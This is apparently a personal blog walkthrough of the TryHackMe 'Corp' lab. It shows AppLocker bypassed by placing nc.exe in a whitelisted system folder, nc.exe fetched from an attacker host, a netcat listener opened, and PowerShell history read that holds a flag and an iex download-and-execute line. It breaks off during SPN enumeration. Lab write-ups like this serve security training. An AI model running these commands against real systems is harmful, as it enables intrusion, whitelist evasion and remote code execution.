@@ -1,0 +1,578 @@
+<!DOCTYPE html> <html lang="en"> <head> <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"> <meta name="google-site-verification" content="uA_65eRzkHXUyK5QY2Pz3N0D7u0dyMoAHD_SQtaPvVA"> <title>Corp</title> <meta name="description" content="Bypassed whitelist in application"> <meta name="keywords" content="cybersecurity, CTF, web security, reverse engineering, pentesting, Linux, Python, malware analysis, exploit development"> <meta name="author" content="Biscotti Diskette"> <meta name="google-site-verification" content="uA_65eRzkHXUyK5QY2Pz3N0D7u0dyMoAHD_SQtaPvVA"> <meta property="og:type" content="website"> <meta property="og:title" content="Corp"> <meta property="og:description" content="Bypassed whitelist in application"> <meta property="og:url" content="https://biscottidiskette.github.io/boxes/38_corp/"> <meta property="og:image" content="https://biscottidiskette.github.io/assets/img/social-preview.png"> <meta property="og:site_name" content="Biscotti Diskette"> <meta name="twitter:card" content="summary_large_image"> <meta name="twitter:title" content="Corp"> <meta name="twitter:description" content="Bypassed whitelist in application"> <meta name="twitter:image" content="https://biscottidiskette.github.io/assets/img/social-preview.png"> <script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "Person",
+  "name": "Biscotti Diskette",
+  "url": "https://biscottidiskette.github.io",
+  "sameAs": [
+    
+  ],
+  "jobTitle": "Cybersecurity Researcher",
+  "worksFor": {
+    "@type": "Organization",
+    "name": "Independent",
+    "url": "https://biscottidiskette.github.io"
+  },
+  "image": "https://biscottidiskette.github.io/assets/img/social-preview.png",
+  "description": "Bypassed whitelist in application"
+}
+</script> <meta name="google-site-verification" content="uA_65eRzkHXUyK5QY2Pz3N0D7u0dyMoAHD_SQtaPvVA"> <meta http-equiv="Permissions-Policy" content="interest-cohort=()"> <meta charset="utf-8"> <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"> <meta http-equiv="X-UA-Compatible" content="IE=edge"> <title> Corp | Biscotti Diskette </title> <meta name="author" content="Biscotti Diskette"> <meta name="description" content="Bypassed whitelist in application"> <meta name="keywords" content="cybersecurity, CTF, web security, reverse engineering, pentesting, Linux, Python, malware analysis, exploit development"> <link rel="stylesheet" href="/assets/css/bootstrap.min.css?a4b3f509e79c54a512b890d73235ef04"> <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/mdbootstrap@4.20.0/css/mdb.min.css" integrity="sha256-jpjYvU3G3N6nrrBwXJoVEYI/0zw8htfFnhT9ljN3JJw=" crossorigin="anonymous"> <link defer rel="stylesheet" href="/assets/css/academicons.min.css?f0b7046b84e425c55f3463ac249818f5"> <link defer rel="stylesheet" href="/assets/css/scholar-icons.css?62b2ac103a88034e6882a5be5f3e2772"> <link defer rel="stylesheet" type="text/css" href="https://fonts.googleapis.com/css?family=Roboto:300,400,500,700|Roboto+Slab:100,300,400,500,700|Material+Icons&amp;display=swap"> <link defer rel="stylesheet" href="/assets/css/jekyll-pygments-themes-github.css?591dab5a4e56573bf4ef7fd332894c99" media="" id="highlight_theme_light"> <link rel="shortcut icon" href="/assets/img/frontpage/Logo3.png?4f879aeff848659581251777fe0ab074"> <link rel="stylesheet" href="/assets/css/main.css?d41d8cd98f00b204e9800998ecf8427e"> <link rel="stylesheet" href="/assets/css/terminal.css?bebbf314b8406d78caf98717f86a33c1"> <link rel="canonical" href="https://biscottidiskette.github.io/boxes/38_corp/"> <script src="/assets/js/theme.js?9a0c749ec5240d9cda97bc72359a72c0"></script> <link defer rel="stylesheet" href="/assets/css/jekyll-pygments-themes-native.css?5847e5ed4a4568527aa6cfab446049ca" media="none" id="highlight_theme_dark"> <script>
+    initTheme();
+  </script> <title>Corp</title> <meta name="description" content="Bypassed whitelist in application"> <meta name="keywords" content="cybersecurity, CTF, web security, reverse engineering, pentesting, Linux, Python, malware analysis, exploit development"> <meta name="author" content="Biscotti Diskette"> <meta name="google-site-verification" content="uA_65eRzkHXUyK5QY2Pz3N0D7u0dyMoAHD_SQtaPvVA"> <meta property="og:type" content="website"> <meta property="og:title" content="Corp"> <meta property="og:description" content="Bypassed whitelist in application"> <meta property="og:url" content="https://biscottidiskette.github.io/boxes/38_corp/"> <meta property="og:image" content="https://biscottidiskette.github.io/assets/img/social-preview.png"> <meta property="og:site_name" content="Biscotti Diskette"> <meta name="twitter:card" content="summary_large_image"> <meta name="twitter:title" content="Corp"> <meta name="twitter:description" content="Bypassed whitelist in application"> <meta name="twitter:image" content="https://biscottidiskette.github.io/assets/img/social-preview.png"> <script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "Person",
+  "name": "Biscotti Diskette",
+  "url": "https://biscottidiskette.github.io",
+  "sameAs": [
+    
+  ],
+  "jobTitle": "Cybersecurity Researcher",
+  "worksFor": {
+    "@type": "Organization",
+    "name": "Independent",
+    "url": "https://biscottidiskette.github.io"
+  },
+  "image": "https://biscottidiskette.github.io/assets/img/social-preview.png",
+  "description": "Bypassed whitelist in application"
+}
+</script> </head> <body class="fixed-top-nav sticky-bottom-footer"> <header> <nav id="navbar" class="navbar navbar-light navbar-expand-sm fixed-top" role="navigation"> <div class="container"> <a class="navbar-brand title font-weight-lighter" href="/"> Biscotti Diskette </a> <button class="navbar-toggler collapsed ml-auto" type="button" data-toggle="collapse" data-target="#navbarNav" aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation"> <span class="sr-only">Toggle navigation</span> <span class="icon-bar top-bar"></span> <span class="icon-bar middle-bar"></span> <span class="icon-bar bottom-bar"></span> </button> <div class="collapse navbar-collapse text-right" id="navbarNav"> <ul class="navbar-nav ml-auto flex-nowrap"> <li class="nav-item "> <a class="nav-link" href="/">about </a> </li> <li class="nav-item "> <a class="nav-link" href="/projects/">projects </a> </li> <li class="nav-item active"> <a class="nav-link" href="/boxes/">boxes <span class="sr-only">(current)</span> </a> </li> <li class="nav-item "> <a class="nav-link" href="/certifications/">certs </a> </li> <li class="nav-item "> <a class="nav-link" href="/repositories/">repos </a> </li> <li class="nav-item "> <a class="nav-link" href="/blog/">blog </a> </li> <li class="nav-item "> <a class="nav-link" href="/contact/">contact </a> </li> </ul> </div> </div> </nav> <progress id="progress" value="0"> <div class="progress-container"> <span class="progress-bar"></span> </div> </progress> </header> <div class="container mt-5" role="main"> <div class="post"> <header class="post-header"> <h1 class="post-title">Corp</h1> <p class="post-description">Bypassed whitelist in application</p> </header> <article> <div class="row justify-content-sm-center"> <div class="col-sm-4 mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/corp/logo.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="THM Corp Logo" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> </div> </div> <h2>Link</h2> <p><a href="https://tryhackme.com/room/corp" rel="external nofollow noopener" target="_blank">Room Link</a></p> <p><br></p> <h2>Process</h2> <p><br> So, this one is more of a walkthrough with THM, but still wanted to post it.</p> <p>Boot up the machine for the room.</p> <div class="row justify-content-sm-center"> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/corp/starting.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="Default Machine" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> </div> </div> <p><br> Copy nc.exe into the local working folder.</p> <div class="terminal" data-language="bash" id="terminal-bash-bash-4491"> <div class="terminal__header"> <div class="terminal__controls"> <button class="terminal__dot terminal__dot--red" onclick="terminalClose('bash-bash-4491')" title="Close"></button> <button class="terminal__dot terminal__dot--yellow" onclick="terminalMinimize('bash-bash-4491')" title="Minimize"></button> <button class="terminal__dot terminal__dot--green" onclick="terminalMaximize('bash-bash-4491')" title="Maximize"></button> </div> <span class="terminal__title">bash</span> <button class="terminal__copy" onclick="terminalCopy('bash-bash-4491')" title="Copy to clipboard"> <svg class="terminal__copy-icon" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"> <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect> <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path> </svg> <span class="terminal__copy-label">copy</span> </button> </div> <pre class="terminal__body" id="terminal-body-bash-bash-4491">
+┌──(kali㉿kali)-[~/Documents/thm/corp]
+└─$ cp $(locate nc.exe) .                                                               
+                                                                                                                                                                                                                                            
+┌──(kali㉿kali)-[~/Documents/thm/corp]
+└─$ python3 -m http.server
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+</pre> </div> <div class="terminal__overlay" id="overlay-bash-bash-4491" onclick="terminalOverlayClose('bash-bash-4491')"> <div class="terminal__modal" onclick="event.stopPropagation()"> <div class="terminal__header"> <div class="terminal__controls"> <button class="terminal__dot terminal__dot--red" onclick="terminalOverlayClose('bash-bash-4491')" title="Close"></button> <button class="terminal__dot terminal__dot--yellow" title="Minimize"></button> <button class="terminal__dot terminal__dot--green" onclick="terminalOverlayClose('bash-bash-4491')" title="Restore"></button> </div> <span class="terminal__title">bash</span> <button class="terminal__copy" onclick="terminalCopyModal('bash-bash-4491')" title="Copy to clipboard"> <svg class="terminal__copy-icon" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"> <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect> <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path> </svg> <span class="terminal__copy-label">copy</span> </button> </div> <pre class="terminal__body terminal__body--modal" id="terminal-modal-body-bash-bash-4491" data-language="bash">
+┌──(kali㉿kali)-[~/Documents/thm/corp]
+└─$ cp $(locate nc.exe) .                                                               
+                                                                                                                                                                                                                                            
+┌──(kali㉿kali)-[~/Documents/thm/corp]
+└─$ python3 -m http.server
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+</pre> </div> </div> <p><br> Start a netcat listener.</p> <div class="terminal" data-language="bash" id="terminal-bash-bash-4140"> <div class="terminal__header"> <div class="terminal__controls"> <button class="terminal__dot terminal__dot--red" onclick="terminalClose('bash-bash-4140')" title="Close"></button> <button class="terminal__dot terminal__dot--yellow" onclick="terminalMinimize('bash-bash-4140')" title="Minimize"></button> <button class="terminal__dot terminal__dot--green" onclick="terminalMaximize('bash-bash-4140')" title="Maximize"></button> </div> <span class="terminal__title">bash</span> <button class="terminal__copy" onclick="terminalCopy('bash-bash-4140')" title="Copy to clipboard"> <svg class="terminal__copy-icon" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"> <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect> <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path> </svg> <span class="terminal__copy-label">copy</span> </button> </div> <pre class="terminal__body" id="terminal-body-bash-bash-4140">
+┌──(kali㉿kali)-[~/Documents/thm/corp]
+└─$ sudo nc -nlvp 443                         
+[sudo] password for kali: 
+listening on [any] 443 ...
+</pre> </div> <div class="terminal__overlay" id="overlay-bash-bash-4140" onclick="terminalOverlayClose('bash-bash-4140')"> <div class="terminal__modal" onclick="event.stopPropagation()"> <div class="terminal__header"> <div class="terminal__controls"> <button class="terminal__dot terminal__dot--red" onclick="terminalOverlayClose('bash-bash-4140')" title="Close"></button> <button class="terminal__dot terminal__dot--yellow" title="Minimize"></button> <button class="terminal__dot terminal__dot--green" onclick="terminalOverlayClose('bash-bash-4140')" title="Restore"></button> </div> <span class="terminal__title">bash</span> <button class="terminal__copy" onclick="terminalCopyModal('bash-bash-4140')" title="Copy to clipboard"> <svg class="terminal__copy-icon" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"> <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect> <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path> </svg> <span class="terminal__copy-label">copy</span> </button> </div> <pre class="terminal__body terminal__body--modal" id="terminal-modal-body-bash-bash-4140" data-language="bash">
+┌──(kali㉿kali)-[~/Documents/thm/corp]
+└─$ sudo nc -nlvp 443                         
+[sudo] password for kali: 
+listening on [any] 443 ...
+</pre> </div> </div> <p><br> Use PowerShell to transfer nc.exe to the victim machine.</p> <div class="terminal" data-language="powershell" id="terminal-powershell-powershell-10101"> <div class="terminal__header"> <div class="terminal__controls"> <button class="terminal__dot terminal__dot--red" onclick="terminalClose('powershell-powershell-10101')" title="Close"></button> <button class="terminal__dot terminal__dot--yellow" onclick="terminalMinimize('powershell-powershell-10101')" title="Minimize"></button> <button class="terminal__dot terminal__dot--green" onclick="terminalMaximize('powershell-powershell-10101')" title="Maximize"></button> </div> <span class="terminal__title">PowerShell</span> <button class="terminal__copy" onclick="terminalCopy('powershell-powershell-10101')" title="Copy to clipboard"> <svg class="terminal__copy-icon" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"> <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect> <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path> </svg> <span class="terminal__copy-label">copy</span> </button> </div> <pre class="terminal__body" id="terminal-body-powershell-powershell-10101">
+PS C:\Users\dark\Desktop&gt; wget http://10.4.119.29:8000/nc.exe -outfile C:\Users\dark\Desktop\nc.exe
+</pre> </div> <div class="terminal__overlay" id="overlay-powershell-powershell-10101" onclick="terminalOverlayClose('powershell-powershell-10101')"> <div class="terminal__modal" onclick="event.stopPropagation()"> <div class="terminal__header"> <div class="terminal__controls"> <button class="terminal__dot terminal__dot--red" onclick="terminalOverlayClose('powershell-powershell-10101')" title="Close"></button> <button class="terminal__dot terminal__dot--yellow" title="Minimize"></button> <button class="terminal__dot terminal__dot--green" onclick="terminalOverlayClose('powershell-powershell-10101')" title="Restore"></button> </div> <span class="terminal__title">PowerShell</span> <button class="terminal__copy" onclick="terminalCopyModal('powershell-powershell-10101')" title="Copy to clipboard"> <svg class="terminal__copy-icon" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"> <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect> <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path> </svg> <span class="terminal__copy-label">copy</span> </button> </div> <pre class="terminal__body terminal__body--modal" id="terminal-modal-body-powershell-powershell-10101" data-language="powershell">
+PS C:\Users\dark\Desktop&gt; wget http://10.4.119.29:8000/nc.exe -outfile C:\Users\dark\Desktop\nc.exe
+</pre> </div> </div> <p><br> AppLocker should block the execution.</p> <div class="row justify-content-sm-center"> <div class="col-sm-8 mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/corp/appblock.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="AppLocker Block" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> </div> </div> <p><br> There are certain paths that are white-listed by default. Move the binary to one of these locations.</p> <div class="terminal" data-language="powershell" id="terminal-powershell-powershell-1086"> <div class="terminal__header"> <div class="terminal__controls"> <button class="terminal__dot terminal__dot--red" onclick="terminalClose('powershell-powershell-1086')" title="Close"></button> <button class="terminal__dot terminal__dot--yellow" onclick="terminalMinimize('powershell-powershell-1086')" title="Minimize"></button> <button class="terminal__dot terminal__dot--green" onclick="terminalMaximize('powershell-powershell-1086')" title="Maximize"></button> </div> <span class="terminal__title">PowerShell</span> <button class="terminal__copy" onclick="terminalCopy('powershell-powershell-1086')" title="Copy to clipboard"> <svg class="terminal__copy-icon" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"> <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect> <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path> </svg> <span class="terminal__copy-label">copy</span> </button> </div> <pre class="terminal__body" id="terminal-body-powershell-powershell-1086">
+PS C:\Users\dark\Desktop&gt; cp .\nc.exe C:\Windows\System32\spool\drivers\color\nc.exe
+</pre> </div> <div class="terminal__overlay" id="overlay-powershell-powershell-1086" onclick="terminalOverlayClose('powershell-powershell-1086')"> <div class="terminal__modal" onclick="event.stopPropagation()"> <div class="terminal__header"> <div class="terminal__controls"> <button class="terminal__dot terminal__dot--red" onclick="terminalOverlayClose('powershell-powershell-1086')" title="Close"></button> <button class="terminal__dot terminal__dot--yellow" title="Minimize"></button> <button class="terminal__dot terminal__dot--green" onclick="terminalOverlayClose('powershell-powershell-1086')" title="Restore"></button> </div> <span class="terminal__title">PowerShell</span> <button class="terminal__copy" onclick="terminalCopyModal('powershell-powershell-1086')" title="Copy to clipboard"> <svg class="terminal__copy-icon" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"> <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect> <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path> </svg> <span class="terminal__copy-label">copy</span> </button> </div> <pre class="terminal__body terminal__body--modal" id="terminal-modal-body-powershell-powershell-1086" data-language="powershell">
+PS C:\Users\dark\Desktop&gt; cp .\nc.exe C:\Windows\System32\spool\drivers\color\nc.exe
+</pre> </div> </div> <p><br> The binary should be able to execute now.</p> <div class="row justify-content-sm-center"> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/corp/ncexe.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="Execution" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> </div> </div> <p><br> Due to difficulties open start, navigate directly to the PowerShell or CMD binary.</p> <div class="row justify-content-sm-center"> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/corp/psbin.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="PowerShell Binary" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> </div> </div> <div class="terminal" data-language="cmd" id="terminal-cmd-exe-cmd-759"> <div class="terminal__header"> <div class="terminal__controls"> <button class="terminal__dot terminal__dot--red" onclick="terminalClose('cmd-exe-cmd-759')" title="Close"></button> <button class="terminal__dot terminal__dot--yellow" onclick="terminalMinimize('cmd-exe-cmd-759')" title="Minimize"></button> <button class="terminal__dot terminal__dot--green" onclick="terminalMaximize('cmd-exe-cmd-759')" title="Maximize"></button> </div> <span class="terminal__title">cmd.exe</span> <button class="terminal__copy" onclick="terminalCopy('cmd-exe-cmd-759')" title="Copy to clipboard"> <svg class="terminal__copy-icon" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"> <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect> <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path> </svg> <span class="terminal__copy-label">copy</span> </button> </div> <pre class="terminal__body" id="terminal-body-cmd-exe-cmd-759">
+C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+</pre> </div> <div class="terminal__overlay" id="overlay-cmd-exe-cmd-759" onclick="terminalOverlayClose('cmd-exe-cmd-759')"> <div class="terminal__modal" onclick="event.stopPropagation()"> <div class="terminal__header"> <div class="terminal__controls"> <button class="terminal__dot terminal__dot--red" onclick="terminalOverlayClose('cmd-exe-cmd-759')" title="Close"></button> <button class="terminal__dot terminal__dot--yellow" title="Minimize"></button> <button class="terminal__dot terminal__dot--green" onclick="terminalOverlayClose('cmd-exe-cmd-759')" title="Restore"></button> </div> <span class="terminal__title">cmd.exe</span> <button class="terminal__copy" onclick="terminalCopyModal('cmd-exe-cmd-759')" title="Copy to clipboard"> <svg class="terminal__copy-icon" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"> <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect> <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path> </svg> <span class="terminal__copy-label">copy</span> </button> </div> <pre class="terminal__body terminal__body--modal" id="terminal-modal-body-cmd-exe-cmd-759" data-language="cmd">
+C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+</pre> </div> </div> <div class="terminal" data-language="cmd" id="terminal-cmd-exe-cmd-729"> <div class="terminal__header"> <div class="terminal__controls"> <button class="terminal__dot terminal__dot--red" onclick="terminalClose('cmd-exe-cmd-729')" title="Close"></button> <button class="terminal__dot terminal__dot--yellow" onclick="terminalMinimize('cmd-exe-cmd-729')" title="Minimize"></button> <button class="terminal__dot terminal__dot--green" onclick="terminalMaximize('cmd-exe-cmd-729')" title="Maximize"></button> </div> <span class="terminal__title">cmd.exe</span> <button class="terminal__copy" onclick="terminalCopy('cmd-exe-cmd-729')" title="Copy to clipboard"> <svg class="terminal__copy-icon" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"> <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect> <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path> </svg> <span class="terminal__copy-label">copy</span> </button> </div> <pre class="terminal__body" id="terminal-body-cmd-exe-cmd-729">
+C:\Windows\System32\cmd.exe
+</pre> </div> <div class="terminal__overlay" id="overlay-cmd-exe-cmd-729" onclick="terminalOverlayClose('cmd-exe-cmd-729')"> <div class="terminal__modal" onclick="event.stopPropagation()"> <div class="terminal__header"> <div class="terminal__controls"> <button class="terminal__dot terminal__dot--red" onclick="terminalOverlayClose('cmd-exe-cmd-729')" title="Close"></button> <button class="terminal__dot terminal__dot--yellow" title="Minimize"></button> <button class="terminal__dot terminal__dot--green" onclick="terminalOverlayClose('cmd-exe-cmd-729')" title="Restore"></button> </div> <span class="terminal__title">cmd.exe</span> <button class="terminal__copy" onclick="terminalCopyModal('cmd-exe-cmd-729')" title="Copy to clipboard"> <svg class="terminal__copy-icon" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"> <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect> <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path> </svg> <span class="terminal__copy-label">copy</span> </button> </div> <pre class="terminal__body terminal__body--modal" id="terminal-modal-body-cmd-exe-cmd-729" data-language="cmd">
+C:\Windows\System32\cmd.exe
+</pre> </div> </div> <p><br> Make sure to check the PowerShell history for the first flag.</p> <div class="terminal" data-language="powershell" id="terminal-powershell-powershell-10994"> <div class="terminal__header"> <div class="terminal__controls"> <button class="terminal__dot terminal__dot--red" onclick="terminalClose('powershell-powershell-10994')" title="Close"></button> <button class="terminal__dot terminal__dot--yellow" onclick="terminalMinimize('powershell-powershell-10994')" title="Minimize"></button> <button class="terminal__dot terminal__dot--green" onclick="terminalMaximize('powershell-powershell-10994')" title="Maximize"></button> </div> <span class="terminal__title">PowerShell</span> <button class="terminal__copy" onclick="terminalCopy('powershell-powershell-10994')" title="Copy to clipboard"> <svg class="terminal__copy-icon" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"> <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect> <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path> </svg> <span class="terminal__copy-label">copy</span> </button> </div> <pre class="terminal__body" id="terminal-body-powershell-powershell-10994">
+PS C:\Windows\System32\WindowsPowerShell\v1.0&gt; cd C:\Users\dark\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline
+PS C:\Users\dark\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline&gt; ls
+
+
+    Directory: C:\Users\dark\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-a----         3/1/2025  12:51 PM            327 ConsoleHost_history.txt
+
+
+PS C:\Users\dark\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline&gt; cat .\ConsoleHost_history.txt
+ls
+dir
+Get-Content test
+flag{a12a41b5f8111327690f836e9b302f0b}
+iex(new-object net.webclient).DownloadString('http://127.0.0.1/test.ps1')
+cls
+exit
+cd  %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\
+echo %userprofile%
+cd C:\Users\dark\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline
+ls
+cat .\ConsoleHost_history.txt
+PS C:\Users\dark\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline&gt;
+</pre> </div> <div class="terminal__overlay" id="overlay-powershell-powershell-10994" onclick="terminalOverlayClose('powershell-powershell-10994')"> <div class="terminal__modal" onclick="event.stopPropagation()"> <div class="terminal__header"> <div class="terminal__controls"> <button class="terminal__dot terminal__dot--red" onclick="terminalOverlayClose('powershell-powershell-10994')" title="Close"></button> <button class="terminal__dot terminal__dot--yellow" title="Minimize"></button> <button class="terminal__dot terminal__dot--green" onclick="terminalOverlayClose('powershell-powershell-10994')" title="Restore"></button> </div> <span class="terminal__title">PowerShell</span> <button class="terminal__copy" onclick="terminalCopyModal('powershell-powershell-10994')" title="Copy to clipboard"> <svg class="terminal__copy-icon" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"> <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect> <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path> </svg> <span class="terminal__copy-label">copy</span> </button> </div> <pre class="terminal__body terminal__body--modal" id="terminal-modal-body-powershell-powershell-10994" data-language="powershell">
+PS C:\Windows\System32\WindowsPowerShell\v1.0&gt; cd C:\Users\dark\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline
+PS C:\Users\dark\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline&gt; ls
+
+
+    Directory: C:\Users\dark\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-a----         3/1/2025  12:51 PM            327 ConsoleHost_history.txt
+
+
+PS C:\Users\dark\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline&gt; cat .\ConsoleHost_history.txt
+ls
+dir
+Get-Content test
+flag{a12a41b5f8111327690f836e9b302f0b}
+iex(new-object net.webclient).DownloadString('http://127.0.0.1/test.ps1')
+cls
+exit
+cd  %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\
+echo %userprofile%
+cd C:\Users\dark\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline
+ls
+cat .\ConsoleHost_history.txt
+PS C:\Users\dark\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline&gt;
+</pre> </div> </div> <p><br> Enumerate the usernames in the Service Principal Name (SPN).</p> <div class="terminal" data-language="powershell" id="terminal-powershell-powershell-101358"> <div class="terminal__header"> <div class="terminal__controls"> <button class="terminal__dot terminal__dot--red" onclick="terminalClose('powershell-powershell-101358')" title="Close"></button> <button class="terminal__dot terminal__dot--yellow" onclick="terminalMinimize('powershell-powershell-101358')" title="Minimize"></button> <button class="terminal__dot terminal__dot--green" onclick="terminalMaximize('powershell-powershell-101358')" title="Maximize"></button> </div> <span class="terminal__title">PowerShell</span> <button class="terminal__copy" onclick="terminalCopy('powershell-powershell-101358')" title="Copy to clipboard"> <svg class="terminal__copy-icon" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"> <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect> <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path> </svg> <span class="terminal__copy-label">copy</span> </button> </div> <pre class="terminal__body" id="terminal-body-powershell-powershell-101358">
+PS C:\Users\dark\Desktop&gt; setspn -T medin -Q */*
+Ldap Error(0x51 -- Server Down): ldap_connect
+Failed to retrieve DN for domain "medin" : 0x00000051
+Warning: No valid targets specified, reverting to current domain.
+CN=OMEGA,OU=Domain Controllers,DC=corp,DC=local
+        Dfsr-12F9A27C-BF97-4787-9364-D31B6C55EB04/omega.corp.local
+        ldap/omega.corp.local/ForestDnsZones.corp.local
+        ldap/omega.corp.local/DomainDnsZones.corp.local
+        TERMSRV/OMEGA
+        TERMSRV/omega.corp.local
+        DNS/omega.corp.local
+        GC/omega.corp.local/corp.local
+        RestrictedKrbHost/omega.corp.local
+        RestrictedKrbHost/OMEGA
+        RPC/7c4e4bec-1a37-4379-955f-a0475cd78a5d._msdcs.corp.local
